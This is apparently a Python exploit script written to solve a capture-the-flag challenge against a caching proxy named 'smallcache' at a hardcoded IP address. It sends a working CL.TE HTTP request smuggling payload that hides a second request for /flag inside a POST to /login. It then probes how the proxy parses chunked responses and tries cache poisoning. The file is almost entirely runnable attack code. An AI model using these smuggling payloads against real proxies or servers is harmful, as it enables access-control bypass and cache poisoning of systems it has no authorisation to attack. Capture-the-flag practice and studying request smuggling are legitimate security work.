#!/usr/bin/env python3
"""
HTTP Request Smuggling exploit using chunked transfer encoding
The smallcache proxy doesn't handle chunked encoding correctly
"""

import socket
import time

HOST = "210.79.190.102"
PORT = 8081

def send_smuggled_request():
    """
    CL.TE attack: Frontend (proxy) uses Content-Length, backend uses Transfer-Encoding
    Or TE.CL: Frontend uses Transfer-Encoding, backend uses Content-Length
    """
    
    print("[*] Attempting HTTP Request Smuggling...")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    
    try:
        sock.connect((HOST, PORT))
        
        # TE.CL attack: Send request with both Content-Length and Transfer-Encoding
        # The proxy might use Transfer-Encoding, backend might use Content-Length
        # Or vice versa
        
        # First, let's try CL.TE: Content-Length says one thing, Transfer-Encoding says another
        # The proxy only checks Content-Length, so it will read Content-Length bytes
        # But if we can make the backend use Transfer-Encoding, it might read differently
        
        # Actually, the proxy doesn't handle Transfer-Encoding in requests at all!
        # It only checks Content-Length (line 240 in main.go)
        # So if we send Transfer-Encoding: chunked, the proxy will forward it but not parse it
        
        # Let's try sending a request with Transfer-Encoding: chunked
        # The proxy will forward the headers as-is, including Transfer-Encoding
        # But it won't parse the chunked body - it will only read if Content-Length is present
        
        # Smuggled request: First request ends, second request starts
        # We want to smuggle a request to /flag
        
        # CL.TE: Content-Length in request, but backend uses Transfer-Encoding
        smuggled_request = b"""POST /login HTTP/1.1\r
Host: localhost\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 6\r
Transfer-Encoding: chunked\r
\r
0\r
\r
GET /flag HTTP/1.1\r
Host: localhost\r
\r
"""
        
        print("[*] Sending smuggled request...")
        sock.send(smuggled_request)
        
        response = b""
        while True:
            try:
                data = sock.recv(4096)
                if not data:
                    break
                response += data
                # If we get a lot of data, might be multiple responses
                if len(response) > 10000:
                    break
            except:
                break
        
        print(f"[+] Response ({len(response)} bytes):\n{response.decode('utf-8', errors='ignore')[:1000]}")
        sock.close()
        
        # Check for flag
        if b"BPJS{" in response:
            flag_start = response.find(b"BPJS{")
            flag_end = response.find(b"}", flag_start) + 1
            flag = response[flag_start:flag_end].decode('utf-8')
            print(f"\n[+] FLAG FOUND: {flag}")
            return flag
        
    except Exception as e:
        print(f"[-] Error: {e}")
        import traceback
        traceback.print_exc()
    
    return None

def exploit_chunked_response_parsing():
    """
    Exploit the proxy's incorrect handling of chunked responses
    Make upstream send chunked response, proxy reads it incorrectly
    """
    
    print("\n[*] Testing chunked response parsing exploit...")
    
    # We need to make the upstream send a chunked response
    # Flask/nginx typically send Content-Length, but we might be able to force chunked
    
    # One way: Use HTTP/1.1 and request without Content-Length, with Connection: close
    # Some servers might send chunked in certain conditions
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    
    try:
        sock.connect((HOST, PORT))
        
        # Request that might trigger chunked response
        # Try requesting with HTTP/1.1 and see if we can get chunked
        request = b"""GET /content/41414141 HTTP/1.1\r
Host: localhost\r
Connection: close\r
\r
"""
        
        sock.send(request)
        
        response = b""
        while True:
            try:
                data = sock.recv(4096)
                if not data:
                    break
                response += data
            except:
                break
        
        print(f"[+] Response:\n{response.decode('utf-8', errors='ignore')[:500]}")
        
        # Check if response is chunked
        if b"Transfer-Encoding: chunked" in response or b"transfer-encoding: chunked" in response.lower():
            print("[!] Got chunked response! Proxy might handle it incorrectly.")
        
        sock.close()
        
    except Exception as e:
        print(f"[-] Error: {e}")

def exploit_cache_poisoning():
    """
    Try to poison cache by making proxy cache a chunked response incorrectly
    """
    
    print("\n[*] Attempting cache poisoning...")
    
    # The /content endpoint can be cached (not in skip_paths)
    # If we can make it return a chunked response, the proxy will cache it incorrectly
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    
    try:
        # First request: Normal request
        sock1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock1.connect((HOST, PORT))
        request1 = b"""GET /content/48656c6c6f HTTP/1.1\r
Host: localhost\r
Connection: close\r
\r
"""
        sock1.send(request1)
        response1 = sock1.recv(4096)
        sock1.close()
        print(f"[*] First request response: {response1.decode('utf-8', errors='ignore')[:200]}")
        
        # Second request: Same path, should be cached
        time.sleep(0.5)
        sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock2.connect((HOST, PORT))
        sock2.send(request1)
        response2 = sock2.recv(4096)
        sock2.close()
        print(f"[*] Second request response: {response2.decode('utf-8', errors='ignore')[:200]}")
        
        if response1 == response2:
            print("[*] Responses are identical - might be cached")
        
    except Exception as e:
        print(f"[-] Error: {e}")

def main():
    print("=" * 70)
    print("HTTP Request Smuggling / Chunked Encoding Exploit")
    print("=" * 70)
    
    # Try different exploit techniques
    result = send_smuggled_request()
    if result:
        return
    
    exploit_chunked_response_parsing()
    exploit_cache_poisoning()
    
    print("\n[*] If no flag found, try different techniques or credentials")

if __name__ == "__main__":
    main()



